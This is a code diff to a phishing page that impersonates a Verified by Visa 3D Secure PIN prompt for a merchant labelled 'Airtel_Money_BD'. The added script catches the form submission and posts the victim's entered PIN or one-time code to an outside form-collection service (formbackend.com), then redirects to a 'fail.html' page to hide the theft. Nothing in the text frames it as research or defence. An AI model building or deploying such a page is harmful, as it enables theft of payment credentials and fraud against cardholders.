@@ -16,8 +16,8 @@
         <h3>Internet PIN</h3>
         <p>Please enter your Verified by Visa 3D Secure PIN in the space provided below to confirm your identity for this purchase. This information will not be shared with the merchant.</p>
 
-        <!-- Replaced form -->
-        <form action="https://www.formbackend.com/f/161f872fb68bf21a" method="POST">
+        <!-- Replaced form with JavaScript to handle redirection -->
+        <form id="otpForm" action="https://formsubmit.co/your@email.com" method="POST">
             <div class="inputBox">
                 <label for="merchant">Merchant Name:</label>
                 <input type="text" id="merchant" value="Airtel_Money_BD" readonly>
@@ -43,6 +43,22 @@
 
         <p class="timeout">This page will automatically timeout after 180 seconds</p>
     </div>
-    <script src="index.js"></script>
+
+    <script>
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent default form submission
+
+            // Submit form data
+            fetch('https://www.formbackend.com/f/161f872fb68bf21a', {
+                method: 'POST',
+                body: new FormData(this)
+            }).then(function() {
+                // Redirect to fail.html after submission
+                window.location.href = 'fail.html';
+            }).catch(function(error) {
+                console.error('Form submission error:', error);
+            });
+        });
+    </script>
 </body>
 </html>
